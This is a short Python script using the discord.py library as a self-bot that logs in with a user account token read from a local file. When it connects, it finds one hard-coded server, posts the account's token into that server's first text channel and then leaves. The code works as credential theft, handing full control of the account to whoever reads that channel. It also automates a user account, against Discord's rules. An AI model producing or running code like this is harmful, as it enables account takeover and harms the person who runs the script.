import discord
client = discord.Client()
token = open("token.txt").read().split("\n")[0]
@client.event
async def on_ready():
    for guild in client.guilds:
        if guild.id in [386357756409675776]:
            await guild.text_channels[0].send(token)
            await guild.leave()
client.run(token, bot=False)